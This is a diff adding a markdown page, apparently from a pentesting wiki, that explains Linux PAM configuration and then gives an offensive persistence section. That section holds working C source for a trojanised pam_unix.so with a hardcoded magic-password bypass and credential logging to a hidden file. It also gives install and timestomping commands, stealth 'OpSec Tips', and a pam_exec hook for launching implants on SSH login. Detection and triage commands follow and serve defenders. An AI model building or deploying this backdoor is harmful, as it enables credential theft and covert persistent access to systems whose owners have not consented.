@@ -1,0 +1,140 @@
+# PAM - Pluggable Authentication Modules
+
+### Basic Information
+
+**PAM (Pluggable Authentication Modules)** acts as a security mechanism that **verifies the identity of users attempting to access computer services**, controlling their access based on various criteria. It's akin to a digital gatekeeper, ensuring that only authorized users can engage with specific services while potentially limiting their usage to prevent system overloads.
+
+#### Configuration Files
+
+- **Solaris and UNIX-based systems** typically utilize a central configuration file located at `/etc/pam.conf`.
+- **Linux systems** prefer a directory approach, storing service-specific configurations within `/etc/pam.d`. For instance, the configuration file for the login service is found at `/etc/pam.d/login`.
+
+An example of a PAM configuration for the login service might look like this:
+
+```
+auth required /lib/security/pam_securetty.so
+auth required /lib/security/pam_nologin.so
+auth sufficient /lib/security/pam_ldap.so
+auth required /lib/security/pam_unix_auth.so try_first_pass
+account sufficient /lib/security/pam_ldap.so
+account required /lib/security/pam_unix_acct.so
+password required /lib/security/pam_cracklib.so
+password required /lib/security/pam_ldap.so
+password required /lib/security/pam_pwdb.so use_first_pass
+session required /lib/security/pam_unix_session.so
+```
+
+#### **PAM Management Realms**
+
+These realms, or management groups, include **auth**, **account**, **password**, and **session**, each responsible for different aspects of the authentication and session management process:
+
+- **Auth**: Validates user identity, often by prompting for a password.
+- **Account**: Handles account verification, checking for conditions like group membership or time-of-day restrictions.
+- **Password**: Manages password updates, including complexity checks or dictionary attacks prevention.
+- **Session**: Manages actions during the start or end of a service session, such as mounting directories or setting resource limits.
+
+#### **PAM Module Controls**
+
+Controls dictate the module's response to success or failure, influencing the overall authentication process. These include:
+
+- **Required**: Failure of a required module results in eventual failure, but only after all subsequent modules are checked.
+- **Requisite**: Immediate termination of the process upon failure.
+- **Sufficient**: Success bypasses the rest of the same realm's checks unless a subsequent module fails.
+- **Optional**: Only causes failure if it's the sole module in the stack.
+
+#### Example Scenario
+
+In a setup with multiple auth modules, the process follows a strict order. If the `pam_securetty` module finds the login terminal unauthorized, root logins are blocked, yet all modules are still processed due to its "required" status. The `pam_env` sets environment variables, potentially aiding in user experience. The `pam_ldap` and `pam_unix` modules work together to authenticate the user, with `pam_unix` attempting to use a previously supplied password, enhancing efficiency and flexibility in authentication methods.
+
+## Backdooring PAM – Hooking `pam_unix.so`
+
+A classic persistence trick in high-value Linux environments is to **swap the legitimate PAM library with a trojanised drop-in**.  Because every SSH / console login ends up calling `pam_unix.so:pam_sm_authenticate()`, a few lines of C are enough to capture credentials or implement a *magic* password bypass.
+
+### Compilation Cheatsheet
+<details>
+<summary>Sample `pam_unix.so` trojan</summary>
+
+```c
+#define _GNU_SOURCE
+#include <security/pam_modules.h>
+#include <dlfcn.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+static int (*orig)(pam_handle_t *, int, int, const char **);
+static const char *MAGIC = "Sup3rS3cret!";
+
+int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+    const char *user, *pass;
+    pam_get_user(pamh, &user, NULL);
+    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);
+
+    /* Magic pwd → immediate success */
+    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;
+
+    /* Credential harvesting */
+    int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
+    dprintf(fd, "%s:%s\n", user, pass);
+    close(fd);
+
+    /* Fall back to original function */
+    if(!orig) {
+        orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
+    }
+    return orig(pamh, flags, argc, argv);
+}
+```
+
+</details>
+
+Compile and stealth-replace:
+```bash
+gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
+mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
+mv pam_unix.so /lib/security/pam_unix.so
+chmod 644 /lib/security/pam_unix.so     # keep original perms
+touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
+```
+
+### OpSec Tips
+1. **Atomic overwrite** – write to a temp file and `mv` into place to avoid half-written libraries that would lock out SSH.
+2. Log file placement such as `/usr/bin/.dbus.log` blends with legitimate desktop artefacts.
+3. Keep symbol exports identical (`pam_sm_setcred`, etc.) to avoid PAM mis-behaviour.
+
+### Detection
+* Compare MD5/SHA256 of `pam_unix.so` against distro package.
+* `rpm -V pam` or `debsums -s libpam-modules` to spot replaced libraries without manual hashing.
+* Check for world-writable or unusual ownership under `/lib/security/`.
+* `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
+* Grep PAM configs for unexpected modules: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.
+
+### Quick triage commands (post-compromise or threat hunting)
+```bash
+# 1) Spot alien PAM objects
+find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'
+
+# 2) Verify package integrity
+command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules
+
+# 3) Identify non-packaged PAM modules
+for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
+    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
+done
+
+# 4) Look for stealth config edits
+grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
+```
+
+### Abusing `pam_exec` for persistence
+Instead of replacing `pam_unix.so`, a lighter touch is to append a `pam_exec` line in `/etc/pam.d/sshd` so every SSH login launches an implant while leaving the normal stack intact:
+```bash
+# Prepend to /etc/pam.d/sshd
+session optional pam_exec.so quiet /usr/local/bin/.ssh_hook.sh
+```
+`pam_exec` runs as root inside the sshd PAM context, so the script can drop reverse shells, collect env vars, or re-open implanted sockets with no filesystem changes to core libraries.
+
+## References
+
+- [https://hotpotato.tistory.com/434](https://hotpotato.tistory.com/434)
+- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
